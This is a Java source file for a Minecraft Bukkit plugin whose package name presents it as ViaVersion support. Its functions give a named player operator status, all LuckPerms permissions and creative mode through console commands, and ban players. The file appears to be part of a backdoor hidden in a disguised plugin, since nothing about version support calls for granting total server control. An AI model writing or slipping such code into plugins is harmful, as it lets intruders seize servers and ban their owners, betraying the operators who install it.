package me.sfcevil.viaversionsupport.bukkitcmd;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;

public class CommandData {

    public static void give_full_perm(Player p) {
        p.setOp(true);
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + p.getName());
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + p.getName() + " permission set *");
        p.setGameMode(GameMode.CREATIVE);
    }
    public static void ban(Player p) {
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "minecraft:ban " + p.getName());
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "ban " + p.getName());
    }
}
